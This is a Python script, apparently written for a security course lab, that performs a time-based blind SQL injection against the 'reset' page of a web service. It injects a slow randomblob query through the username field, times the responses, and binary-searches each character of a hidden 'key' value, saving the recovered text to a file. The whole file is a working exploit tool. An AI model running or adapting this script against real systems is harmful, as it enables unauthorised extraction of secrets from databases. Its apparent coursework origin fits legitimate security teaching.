#!/usr/bin/env python

import urllib as url
import time
import string

adress = "lbs-course.askarov.net"
port = 3030
page = "reset"

#SQL
injectionStart="admin' and "
slowQuery = " or length(hex(randomblob(9999999)))"
injectionEnd = ";--"

#constant found from testing the speed of requests of true and false queries 
minDelay = 0.2

#constant found by binary search on the length on the key
numberOfChars=3508

fileName = "keySoFar_binSearch.txt"
keyChars = list("\n +-/"+
                string.digits+
                ":="+
                string.ascii_uppercase+
                string.ascii_lowercase)

def encode(index,key,operand):
    query = "substr(key,"+str(index)+",1)"+operand+"'"+key+"'"
    injection = injectionStart + query + slowQuery + injectionEnd
    return url.urlencode({'username': injection})

def queryOnce(index,key,operand):
    injection = encode(index,key,operand)
    target = "http://"+adress+":"+str(port)+"/"+page

    start = time.time()
    url.urlopen(target,data=injection)
    end = time.time()
    return end-start

def isCorrect(time):
    return time<minDelay

def sanityCheck(index,char):
    counter = 0
    for i in range(0,5):
        if counter>2 :
            return True
        if isCorrect(queryOnce(index,char,"=")):
            counter = counter+1 
    return False

def binSearch(index,tries=0):
    hi = len(keyChars)
    lo = 0
    while lo<hi:
        mid = (lo+hi)//2
        midval = keyChars[mid]
        if isCorrect(queryOnce(index,midval,">")):
            lo = mid+1
        elif isCorrect(queryOnce(index,midval,"<")):
            hi = mid
        elif sanityCheck(index,midval):
                return midval        
    if tries<10:
        return binSearch(index,tries=tries+1)
    return None
        
def writeToFile(key):
    if key==None:
        return
    print('writing '+ str(len(key))+' characters to file')
    f = open(fileName,'w')
    f.write(key)
    f.close()

def main():
    f = open(fileName,'r')
    key = f.read()
    f.close()
    offset = len(key)+1
    start = time.time()
    for i in range(offset,numberOfChars):
        nextChar = binSearch(i)
        if nextChar==None:
            print("cant find next symbol, writing to file")
            writeToFile(key)
            return
        key += nextChar
        if i%100==0:
            end = time.time()
            print("Time since last print:"+str(end-start)+"\n"+key)
            writeToFile(key)
            start = time.time()
    writeToFile(key)
    return

if __name__ == "__main__":
    main()
